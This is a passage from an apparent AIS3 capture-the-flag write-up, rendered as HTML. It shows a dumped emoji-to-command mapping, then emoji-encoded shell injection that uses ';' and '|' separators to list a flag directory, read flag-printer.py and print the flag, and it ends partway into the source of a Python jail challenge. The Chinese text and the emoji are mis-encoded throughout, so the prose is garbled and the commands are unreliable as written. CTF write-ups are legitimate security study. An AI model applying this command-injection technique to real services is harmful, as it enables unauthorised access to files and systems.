class="string">&quot;:&#x27;(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤¡&quot;</span>: <span class="string">&quot;:o)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤ &quot;</span>: <span class="string">&quot;Y)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤¥&quot;</span>: <span class="string">&quot;:L&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤«&quot;</span>: <span class="string">&quot;:x&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤­&quot;</span>: <span class="string">&quot;:x&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¶&quot;</span>: <span class="string">&quot;dog&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ±&quot;</span>: <span class="string">&quot;cat&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ­&quot;</span>: <span class="string">&quot;mouse&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¹&quot;</span>: <span class="string">&quot;hamster&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ°&quot;</span>: <span class="string">&quot;rabbit&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦Š&quot;</span>: <span class="string">&quot;fox&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ»&quot;</span>: <span class="string">&quot;bear&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¼&quot;</span>: <span class="string">&quot;panda&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¨&quot;</span>: <span class="string">&quot;koala&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¯&quot;</span>: <span class="string">&quot;tiger&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦&quot;</span>: <span class="string">&quot;lion&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ®&quot;</span>: <span class="string">&quot;cow&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ·&quot;</span>: <span class="string">&quot;pig&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ½&quot;</span>: <span class="string">&quot;pig nose&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¸&quot;</span>: <span class="string">&quot;frog&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ’&quot;</span>: <span class="string">&quot;monkey&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ”&quot;</span>: <span class="string">&quot;chicken&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ§&quot;</span>: <span class="string">&quot;penguin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦&quot;</span>: <span class="string">&quot;bird&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¤&quot;</span>: <span class="string">&quot;baby chick&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ£&quot;</span>: <span class="string">&quot;hatching chick&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¥&quot;</span>: <span class="string">&quot;front-facing baby chick&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦†&quot;</span>: <span class="string">&quot;duck&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦…&quot;</span>: <span class="string">&quot;eagle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦‰&quot;</span>: <span class="string">&quot;owl&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦‡&quot;</span>: <span class="string">&quot;bat&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸº&quot;</span>: <span class="string">&quot;wolf&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ—&quot;</span>: <span class="string">&quot;boar&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ´&quot;</span>: <span class="string">&quot;horse&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦„&quot;</span>: <span class="string">&quot;unicorn&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ&quot;</span>: <span class="string">&quot;bee&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ›&quot;</span>: <span class="string">&quot;bug&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦‹&quot;</span>: <span class="string">&quot;butterfly&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸŒ&quot;</span>: <span class="string">&quot;snail&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ&quot;</span>: <span class="string">&quot;lady beetle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸœ&quot;</span>: <span class="string">&quot;ant&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦Ÿ&quot;</span>: <span class="string">&quot;mosquito&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦—&quot;</span>: <span class="string">&quot;cricket&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ•·ï¸&quot;</span>: <span class="string">&quot;spider&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ•¸ï¸&quot;</span>: <span class="string">&quot;spider web&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦‚&quot;</span>: <span class="string">&quot;scorpion&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¢&quot;</span>: <span class="string">&quot;turtle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ&quot;</span>: <span class="string">&quot;python&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦&quot;</span>: <span class="string">&quot;lizard&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦–&quot;</span>: <span class="string">&quot;T-Rex&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦•&quot;</span>: <span class="string">&quot;sauropod&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ™&quot;</span>: <span class="string">&quot;octopus&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦‘&quot;</span>: <span class="string">&quot;squid&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦&quot;</span>: <span class="string">&quot;shrimp&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦&quot;</span>: <span class="string">&quot;lobster&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦€&quot;</span>: <span class="string">&quot;crab&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¡&quot;</span>: <span class="string">&quot;blowfish&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ &quot;</span>: <span class="string">&quot;tropical fish&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸŸ&quot;</span>: <span class="string">&quot;fish&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¬&quot;</span>: <span class="string">&quot;dolphin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ³&quot;</span>: <span class="string">&quot;whale&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ‹&quot;</span>: <span class="string">&quot;whale&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦ˆ&quot;</span>: <span class="string">&quot;shark&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸŠ&quot;</span>: <span class="string">&quot;crocodile&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ…&quot;</span>: <span class="string">&quot;tiger&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ†&quot;</span>: <span class="string">&quot;leopard&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦“&quot;</span>: <span class="string">&quot;zebra&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦&quot;</span>: <span class="string">&quot;gorilla&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦§&quot;</span>: <span class="string">&quot;orangutan&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦£&quot;</span>: <span class="string">&quot;mammoth&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ˜&quot;</span>: <span class="string">&quot;elephant&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦›&quot;</span>: <span class="string">&quot;hippopotamus&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦&quot;</span>: <span class="string">&quot;rhinoceros&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸª&quot;</span>: <span class="string">&quot;camel&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ«&quot;</span>: <span class="string">&quot;two-hump camel&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦’&quot;</span>: <span class="string">&quot;giraffe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦˜&quot;</span>: <span class="string">&quot;kangaroo&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦¬&quot;</span>: <span class="string">&quot;bison&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦¥&quot;</span>: <span class="string">&quot;sloth&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦¦&quot;</span>: <span class="string">&quot;otter&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦¨&quot;</span>: <span class="string">&quot;skunk&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¦¡&quot;</span>: <span class="string">&quot;badger&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ¾&quot;</span>: <span class="string">&quot;paw prints&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â—¼ï¸&quot;</span>: <span class="string">&quot;black square&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â—»ï¸&quot;</span>: <span class="string">&quot;white square&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â—¾&quot;</span>: <span class="string">&quot;black medium square&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â—½&quot;</span>: <span class="string">&quot;white medium square&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â–ªï¸&quot;</span>: <span class="string">&quot;black small square&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â–«ï¸&quot;</span>: <span class="string">&quot;white small square&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ”¶&quot;</span>: <span class="string">&quot;large orange diamond&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ”·&quot;</span>: <span class="string">&quot;large blue diamond&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ”¸&quot;</span>: <span class="string">&quot;small orange diamond&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ”¹&quot;</span>: <span class="string">&quot;small blue diamond&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ”º&quot;</span>: <span class="string">&quot;triangle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ”»&quot;</span>: <span class="string">&quot;triangle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ”¼&quot;</span>: <span class="string">&quot;triangle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ”½&quot;</span>: <span class="string">&quot;triangle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ”˜&quot;</span>: <span class="string">&quot;circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;âšª&quot;</span>: <span class="string">&quot;circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;âš«&quot;</span>: <span class="string">&quot;black circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸŸ &quot;</span>: <span class="string">&quot;orange circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸŸ¢&quot;</span>: <span class="string">&quot;green circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ”µ&quot;</span>: <span class="string">&quot;blue circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸŸ£&quot;</span>: <span class="string">&quot;purple circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸŸ¡&quot;</span>: <span class="string">&quot;yellow circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸŸ¤&quot;</span>: <span class="string">&quot;brown circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â­•&quot;</span>: <span class="string">&quot;empty circle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ…°ï¸&quot;</span>: <span class="string">&quot;A&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ…±ï¸&quot;</span>: <span class="string">&quot;B&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ…¾ï¸&quot;</span>: <span class="string">&quot;O&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â„¹ï¸&quot;</span>: <span class="string">&quot;i&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ…¿ï¸&quot;</span>: <span class="string">&quot;P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â“‚ï¸&quot;</span>: <span class="string">&quot;M&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ†&quot;</span>: <span class="string">&quot;AB&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ†‘&quot;</span>: <span class="string">&quot;CL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ†’&quot;</span>: <span class="string">&quot;COOL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ†“&quot;</span>: <span class="string">&quot;FREE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ†”&quot;</span>: <span class="string">&quot;ID&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ†•&quot;</span>: <span class="string">&quot;NEW&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ†–&quot;</span>: <span class="string">&quot;NG&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ†—&quot;</span>: <span class="string">&quot;OK&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ†˜&quot;</span>: <span class="string">&quot;SOS&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ†™&quot;</span>: <span class="string">&quot;UP&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ†š&quot;</span>: <span class="string">&quot;VS&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ãŠ—ï¸&quot;</span>: <span class="string">&quot;ç¥&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ãŠ™ï¸&quot;</span>: <span class="string">&quot;ç§˜&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸˆº&quot;</span>: <span class="string">&quot;ç‡Ÿ&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸˆ¯&quot;</span>: <span class="string">&quot;æŒ‡&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ‰&quot;</span>: <span class="string">&quot;å¾—&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸˆ¹&quot;</span>: <span class="string">&quot;å‰²&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸˆš&quot;</span>: <span class="string">&quot;ç„¡&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸˆ²&quot;</span>: <span class="string">&quot;ç¦&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸˆ¸&quot;</span>: <span class="string">&quot;ç”³&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸˆ´&quot;</span>: <span class="string">&quot;åˆ&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸˆ³&quot;</span>: <span class="string">&quot;ç©º&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸˆµ&quot;</span>: <span class="string">&quot;æ»¿&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸˆ¶&quot;</span>: <span class="string">&quot;æœ‰&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸˆ·ï¸&quot;</span>: <span class="string">&quot;æœˆ&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸš—&quot;</span>: <span class="string">&quot;car&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸš•&quot;</span>: <span class="string">&quot;taxi&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸš™&quot;</span>: <span class="string">&quot;SUV&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸšŒ&quot;</span>: <span class="string">&quot;bus&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸš&quot;</span>: <span class="string">&quot;trolleybus&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸï¸&quot;</span>: <span class="string">&quot;race car&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸš“&quot;</span>: <span class="string">&quot;police car&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸš‘&quot;</span>: <span class="string">&quot;ambulance&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸš’&quot;</span>: <span class="string">&quot;fire engine&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸš&quot;</span>: <span class="string">&quot;minibus&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸšš&quot;</span>: <span class="string">&quot;delivery truck&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸš›&quot;</span>: <span class="string">&quot;articulated lorry&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸšœ&quot;</span>: <span class="string">&quot;tractor&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ›´&quot;</span>: <span class="string">&quot;kick scooter&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸš²&quot;</span>: <span class="string">&quot;bicycle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ›µ&quot;</span>: <span class="string">&quot;scooter&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸï¸&quot;</span>: <span class="string">&quot;motorcycle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;âœˆï¸&quot;</span>: <span class="string">&quot;airplane&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸš€&quot;</span>: <span class="string">&quot;rocket&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ›¸&quot;</span>: <span class="string">&quot;UFO&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸš&quot;</span>: <span class="string">&quot;helicopter&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ›¶&quot;</span>: <span class="string">&quot;canoe&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â›µ&quot;</span>: <span class="string">&quot;sailboat&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸš¤&quot;</span>: <span class="string">&quot;speedboat&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ›³ï¸&quot;</span>: <span class="string">&quot;passenger ship&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â›´ï¸&quot;</span>: <span class="string">&quot;ferry&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ›¥ï¸&quot;</span>: <span class="string">&quot;motor boat&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸš¢&quot;</span>: <span class="string">&quot;ship&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ‘¨&quot;</span>: <span class="string">&quot;man&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ‘©&quot;</span>: <span class="string">&quot;woman&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ‘¶&quot;</span>: <span class="string">&quot;baby&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ§“&quot;</span>: <span class="string">&quot;old man&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ‘µ&quot;</span>: <span class="string">&quot;old woman&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ’¿&quot;</span>: <span class="string">&quot;CD&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ“€&quot;</span>: <span class="string">&quot;DVD&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ“±&quot;</span>: <span class="string">&quot;phone&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ’»&quot;</span>: <span class="string">&quot;laptop&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ–¥ï¸&quot;</span>: <span class="string">&quot;pc&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ–¨ï¸&quot;</span>: <span class="string">&quot;printer&quot;</span>,</span><br><span class="line">    <span class="string">&quot;âŒ¨ï¸&quot;</span>: <span class="string">&quot;keyboard&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ–±ï¸&quot;</span>: <span class="string">&quot;mouse&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ–²ï¸&quot;</span>: <span class="string">&quot;trackball&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ•¹ï¸&quot;</span>: <span class="string">&quot;joystick&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ—œï¸&quot;</span>: <span class="string">&quot;clamp&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ’¾&quot;</span>: <span class="string">&quot;floppy disk&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ’½&quot;</span>: <span class="string">&quot;minidisc&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â˜ï¸&quot;</span>: <span class="string">&quot;telephone&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ“Ÿ&quot;</span>: <span class="string">&quot;pager&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ“º&quot;</span>: <span class="string">&quot;television&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ“»&quot;</span>: <span class="string">&quot;radio&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ™ï¸&quot;</span>: <span class="string">&quot;studio microphone&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸšï¸&quot;</span>: <span class="string">&quot;level slider&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ›ï¸&quot;</span>: <span class="string">&quot;control knobs&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â°&quot;</span>: <span class="string">&quot;alarm clock&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ•°ï¸&quot;</span>: <span class="string">&quot;mantelpiece clock&quot;</span>,</span><br><span class="line">    <span class="string">&quot;âŒš&quot;</span>: <span class="string">&quot;watch&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ“¡&quot;</span>: <span class="string">&quot;satellite antenna&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ”‹&quot;</span>: <span class="string">&quot;battery&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸ”Œ&quot;</span>: <span class="string">&quot;plug&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ğŸš©&quot;</span>: <span class="string">&quot;flag&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â“¿&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â¶&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â·&quot;</span>: <span class="string">&quot;2&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â¸&quot;</span>: <span class="string">&quot;3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â¹&quot;</span>: <span class="string">&quot;4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;âº&quot;</span>: <span class="string">&quot;5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â»&quot;</span>: <span class="string">&quot;6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â¼&quot;</span>: <span class="string">&quot;7&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â½&quot;</span>: <span class="string">&quot;8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â¾&quot;</span>: <span class="string">&quot;9&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â¿&quot;</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â­&quot;</span>: <span class="string">&quot;*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â•&quot;</span>: <span class="string">&quot;+&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â–&quot;</span>: <span class="string">&quot;-&quot;</span>,</span><br><span class="line">    <span class="string">&quot;âœ–ï¸&quot;</span>: <span class="string">&quot;Ã—&quot;</span>,</span><br><span class="line">    <span class="string">&quot;â—&quot;</span>: <span class="string">&quot;Ã·&quot;</span></span><br><span class="line"></span><br><span class="line">&#125;cat: flag: Is a directory</span><br><span class="line">cat: templates: Is a directory</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>ç¾åœ¨æˆ‘å€‘å¾—åˆ°ä¸€å€‹jsonæœ‰æ‰€æœ‰æŒ‡ä»¤çš„å°ç…§è¡¨ï¼Œä¸¦ä¸”å¯ä»¥çŸ¥é“flagæ‡‰è©²æ˜¯åœ¨ <code>flag</code> çš„è³‡æ–™å¤¾ã€‚</p>
<p>å˜—è©¦ <code>cat</code> flag è³‡æ–™å¤¾è£¡é¢çš„æ±è¥¿ï¼Œå¯ä»¥å¾å‰›å‰› dump å‡ºä¾†çš„ json æ‰¾å¯ä»¥ç”¨çš„æŒ‡ä»¤ï¼Œé€™é‚Šä½¿ç”¨<code>;/</code>å’Œ<code>:|</code>åˆ‡å‰²æŒ‡ä»¤ï¼Œå›å‚³çš„çµæœä¼¼ä¹æ˜¯ä¸€å€‹ python file</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ğŸ’¿ ğŸš©ğŸ˜“ğŸ˜‘ğŸ± â­ <span class="comment">#cd flag;/:|</span></span><br></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#flag-printer.py</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read())</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>åŸ·è¡Œpythonï¼Œget flag<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ğŸ’¿ ğŸš©ğŸ˜“ğŸ˜‘ğŸâ¸ ğŸš©â–ğŸ–¨ï¸â­</span><br></pre></td></tr></table></figure></li>
</ol>
<blockquote>
<p>AIS3{ğŸ«µğŸª¡ğŸ‰ğŸ¤™ğŸ¤™ğŸ¤™ğŸ‘‰ğŸ‘‰ğŸš©ğŸ‘ˆğŸ‘ˆ}</p>
</blockquote>
<h2 id="Can-you-describe-Pyjail"><a href="#Can-you-describe-Pyjail" class="headerlink" title="Can you describe Pyjail?"></a>Can you describe Pyjail?</h2><blockquote>
<p>Yet another ğŸ â›“ï¸.<br>nc chals1.ais3.org 48763<br>Author: Vincent55</p>
</blockquote>
<p>é€™é¡Œä¸æ˜¯æˆ‘å‡ºçš„ï¼Œä½†æ˜¯ Vincent å¤§ä½¬å‡ºçš„é¡Œç›®é‚„æ˜¯è¦æ§å ´ä¸€ä¸‹</p>
<h3 id="source-code"><a href="#source-code" class="headerlink" title="source code"></a>source code</h3><p>çœ‹source codeå¯ä»¥çŸ¥é“æ˜¯å¾ˆç´”çš„pyjailï¼Œåœ¨ <code>safe_eval</code> è£¡é¢å°±æŠŠè©² ban çš„éƒ½ ban å…‰äº†</p>
<p><del>è·Ÿå‰é¢é‚£é¡Œ evil calculator æ¯”èµ·ä¾† calculator ä¸€é»éƒ½ä¸ evil</del></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> safe_eval <span class="keyword">import</span> safe_eval</span><br><span class="line"><span class="keyword">from</span> inspect <span class="keyword">import</span> getdoc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Desc</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Welcome to my ğŸ â›“ï¸</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__get__</span>(<span class="params">self, objname, obj</span>):</span><br><span class="line">        <span class="keyword">return</span> 